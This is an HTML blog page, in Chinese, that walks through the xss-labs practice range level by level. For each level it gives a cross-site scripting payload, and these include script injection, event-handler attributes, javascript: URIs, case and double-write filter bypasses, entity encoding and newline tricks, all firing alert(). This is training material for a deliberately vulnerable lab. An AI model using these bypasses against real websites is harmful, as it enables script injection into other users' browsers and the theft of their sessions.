@@ -1,0 +1,331 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>xss-labs | gudiffany_blog</title>
+<link rel="shortcut icon" href="https://gudiffany.github.io//favicon.ico?v=1664035675532">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://gudiffany.github.io//styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="xss-labs | gudiffany_blog - Atom Feed" href="https://gudiffany.github.io//atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+    <meta name="description" content="xss-labs
+level1
+观察后直接再url上的test添加
+&lt;script&gt;alert(&quot;100&quot;)&lt;/script&gt;
+
+level2
+使用搜索框，输入
+&lt;script&gt;ale..." />
+    <meta name="keywords" content="" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://gudiffany.github.io/">
+  <img class="avatar" src="https://gudiffany.github.io//images/avatar.png?v=1664035675532" alt="">
+  </a>
+  <h1 class="site-title">
+    gudiffany_blog
+  </h1>
+  <p class="site-description">
+    温故而知新
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="/about" class="menu">
+          关于
+        </a>
+      
+    
+      
+        <a href="/find" class="menu">
+          find
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              xss-labs
+            </h2>
+            <div class="post-info">
+              <span>
+                2022-08-14
+              </span>
+              <span>
+                6 min read
+              </span>
+              
+            </div>
+            
+            <div class="post-content-wrapper">
+              <div class="post-content" v-pre>
+                <h1 id="xss-labs">xss-labs</h1>
+<h2 id="level1">level1</h2>
+<p>观察后直接再url上的test添加</p>
+<pre><code class="language-html">&lt;script&gt;alert(&quot;100&quot;)&lt;/script&gt;
+</code></pre>
+<h2 id="level2">level2</h2>
+<p>使用搜索框，输入</p>
+<pre><code class="language-html">&lt;script&gt;alert(&quot;100&quot;)&lt;/script&gt;
+</code></pre>
+<p>但是被过滤了一部分</p>
+<p>&lt; &gt; “ ”被过滤</p>
+<p>因此需要绕过</p>
+<p>查资料之后发现，&lt; &gt; “ ”被转化成实体html字符实体。</p>
+<p>但是，语句经过了一个input转化为文本，于是可以利用input闭合</p>
+<pre><code class="language-html">&quot;&gt;&lt;script&gt;alert(&quot;100&quot;)&lt;/script&gt;
+</code></pre>
+<h2 id="level3">level3</h2>
+<p>即使对input进行闭合，也无法绕过，依然会对&lt;&gt;等进行过滤</p>
+<p>于是需要有一个不用&lt;&gt;的语句</p>
+<p>查资料发现有以下几种</p>
+<pre><code class="language-html">' onclick ='javascript:alert(1)'
+</code></pre>
+<p>点击事件</p>
+<pre><code class="language-html">' onmouseover='javascript:alert(1)'
+</code></pre>
+<p>鼠标移入</p>
+<pre><code class="language-html">'onfocus='javascript:alert(1)'
+</code></pre>
+<p>聚焦点击</p>
+<h2 id="level4">level4</h2>
+<p>单引号换成双引号即可</p>
+<h2 id="level5">level5</h2>
+<p>本题测试之后，首先过滤&lt;&gt;，还有在on，script中会插入_</p>
+<p>那么之前的方法都不能用了</p>
+<p>使用</p>
+<pre><code class="language-html">&quot;&gt;&lt;input type=&quot;url&quot; src=&quot;javascript:alert(‘xss’);&quot;&gt;
+</code></pre>
+<p>进行构造，发现&quot;&gt;留在了搜索框的后面，也就是说有url的注入</p>
+<p>可以用</p>
+<pre><code class="language-html">&quot;&gt;&lt;a href=javascript:alert('xss')&gt;100&lt;/a&gt;
+</code></pre>
+<p>进行构造</p>
+<h2 id="level6">level6</h2>
+<p>比较有趣的是，相比于level5，6少了一个对输入全小写的处理过程，于是可以用大小写绕过str_replace</p>
+<pre><code class="language-html">&quot;&gt;&lt;a hrEf=javascript:alert('xss')&gt;100&lt;/a&gt;
+</code></pre>
+<h2 id="level7">level7</h2>
+<p>过滤script，href,因此需要新思路来看，由于是直接删除字段，那么根据sqli-labs的less25来看，对其进行双写即可</p>
+<pre><code class="language-html">&quot;&gt;&lt;a hrehreff=javascrscriptipt:alert('xss')&gt;100&lt;/a&gt;
+</code></pre>
+<h3 id="level8">level8</h3>
+<p>过滤script，href以及双引号，因此需要看一下源码，发现注入点有两个，其中一个直接放入<a></a>中的url中，于是直接用javascript:alert('xss')同时逃过即可</p>
+<p>而在使用url时，会进行一次解码，所以用unicode编码绕过</p>
+<pre><code class="language-html">&amp;#x006a;&amp;#x0061;&amp;#x0076;&amp;#x0061;&amp;#x0073;&amp;#x0063;&amp;#x0072;&amp;#x0069;&amp;#x0070;&amp;#x0074;&amp;#x003a;&amp;#x0061;&amp;#x006c;&amp;#x0065;&amp;#x0072;&amp;#x0074;&amp;#x0028;&amp;#x0027;&amp;#x0078;&amp;#x0073;&amp;#x0073;&amp;#x0027;&amp;#x0029;
+</code></pre>
+<p>或者</p>
+<pre><code>&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#39;&amp;#120;&amp;#115;&amp;#115;&amp;#39;&amp;#41;
+</code></pre>
+<h2 id="level9">level9</h2>
+<p>需要具有http://的字段</p>
+<p>于是</p>
+<pre><code class="language-html">&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#39;&amp;#120;&amp;#115;&amp;#115;http://&amp;#39;&amp;#41;
+</code></pre>
+<p>加上http://即可</p>
+<h2 id="level10">level10</h2>
+<p>查看源码发现只有t_sort可以利用，但是在没有源码的情况下如何测试？</p>
+<pre><code class="language-html">&amp;t_link=&quot; type=&quot;text&quot; &amp;t_history=&quot; type=&quot;text&quot; &amp;t_sort=&quot; type=&quot;text&quot;
+</code></pre>
+<p>直接将其放入url发现只有t_sort有反应</p>
+<p>然后就可以直接构造payload</p>
+<pre><code class="language-html">&amp;t_sort=&quot; type=&quot;text” onmouseover=&quot;javascript:alert(1)
+</code></pre>
+<h2 id="level11">level11</h2>
+<pre><code class="language-html">&amp;t_link=&quot;type=&quot;text&amp;t_history=&quot;type=&quot;text&amp;t_sort=&quot;type=&quot;text&amp;t_ref=&quot;type=&quot;text
+</code></pre>
+<p>依然是t_sort有反应，把上一题的payload扔进去，发现”“转码了</p>
+<p>使用unicode试试，发现传不进去</p>
+<p>只能看源码了，发现直接跟refer有关，因此需要抓包了</p>
+<p>然后发现refer直接传到t_ref的value中</p>
+<p>于是可以直接构造</p>
+<pre><code class="language-html">&quot; type=&quot;text&quot; onmousemove=&quot;alert(1)
+</code></pre>
+<h2 id="level12">level12</h2>
+<p>在UA处进行注入</p>
+<pre><code class="language-html">&quot; type=&quot;text&quot; onmousemove=&quot;alert(1)
+</code></pre>
+<h2 id="level13">level13</h2>
+<p>靶场好像出了一点点问题</p>
+<p>出现了不正常的warning，问题不大，看了源码后就可以直接发现是cookie</p>
+<h2 id="level14">level14</h2>
+<p>整个网页有问题没法做</p>
+<p>最终的payload为</p>
+<pre><code class="language-html">'&quot;&gt;&lt;img src=1 onerror=alert(document.domain)&gt;'
+</code></pre>
+<p>原理为img的链接不存在会直接执行报错语句</p>
+<h2 id="level15">level15</h2>
+<p>刚开始有一个404界面，删去src之后正常了</p>
+<p>那么src就是其中的一个注入点，看源码之后发现其中有一个ng-include:在body里面</p>
+<p>那么根据查了一下资料</p>
+<p><strong>ng-include</strong> 指令用于包含外部的 HTML 文件。</p>
+<p>包含的内容将作为指定元素的子节点。</p>
+<p><code>ng-include</code> 属性的值可以是一个表达式，返回一个文件名。</p>
+<p>默认情况下，包含的文件需要包含在同一个域名下。</p>
+<pre><code class="language-html">&lt;element ng-include=&quot;filename&quot; onload=&quot;expression&quot; autoscroll=&quot;expression&quot; &gt;&lt;/element&gt;
+</code></pre>
+<p>ng-include 指令作为元素使用:</p>
+<pre><code class="language-html">&lt;ng-include src=&quot;filename&quot; onload=&quot;expression&quot; autoscroll=&quot;expression&quot; &gt;&lt;/ng-include&gt;
+</code></pre>
+<p>也就是说可以利用同域名下的网页包含xss</p>
+<pre><code class="language-html">level1.php?name=&lt;script&gt;alert(&quot;100&quot;)&lt;/script&gt;
+</code></pre>
+<p>但是没法成功</p>
+<pre><code class="language-html">?src='level1.php?name=&lt;img src=1 onerror=alert(&quot;xss&quot;)&gt;'
+?src='level1.php?name=&lt;input onclick=alert(&quot;xss&quot;)&gt;'
+?src='level1.php?name=&lt;a href=&quot;javascript:alert(233)&quot;&gt;xss&lt;/a&gt;'
+</code></pre>
+<p>上面都是可行的（不知道为什么）</p>
+<h2 id="level16">level16</h2>
+<p>过滤了空格和/</p>
+<p>可以用%0a,%0d代替</p>
+<pre><code class="language-html">&lt;img%0asrc=2%0aonerror=alert(1)&gt;
+
+&lt;img%0dsrc=2%0donerror=alert(1)&gt;
+</code></pre>
+<h2 id="level17-20">level17-20</h2>
+<p>插件不支持(IE也只能支持17和18，19出bug)</p>
+<pre><code class="language-html">?arg01=a&amp;arg02=b%20onmouseover=%27javascript:alert(1)%27
+</code></pre>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li><a href="#xss-labs">xss-labs</a>
+<ul>
+<li><a href="#level1">level1</a></li>
+<li><a href="#level2">level2</a></li>
+<li><a href="#level3">level3</a></li>
+<li><a href="#level4">level4</a></li>
+<li><a href="#level5">level5</a></li>
+<li><a href="#level6">level6</a></li>
+<li><a href="#level7">level7</a>
+<ul>
+<li><a href="#level8">level8</a></li>
+</ul>
+</li>
+<li><a href="#level9">level9</a></li>
+<li><a href="#level10">level10</a></li>
+<li><a href="#level11">level11</a></li>
+<li><a href="#level12">level12</a></li>
+<li><a href="#level13">level13</a></li>
+<li><a href="#level14">level14</a></li>
+<li><a href="#level15">level15</a></li>
+<li><a href="#level16">level16</a></li>
+<li><a href="#level17-20">level17-20</a></li>
+</ul>
+</li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://gudiffany.github.io/post/sqli-lab-wp/">
+              <h3 class="post-title">
+                sqli-lab
+              </h3>
+            </a>
+          </div>
+        
+
+        
+
+        <div class="site-footer">
+  Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a>
+  <a class="rss" href="https://gudiffany.github.io//atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
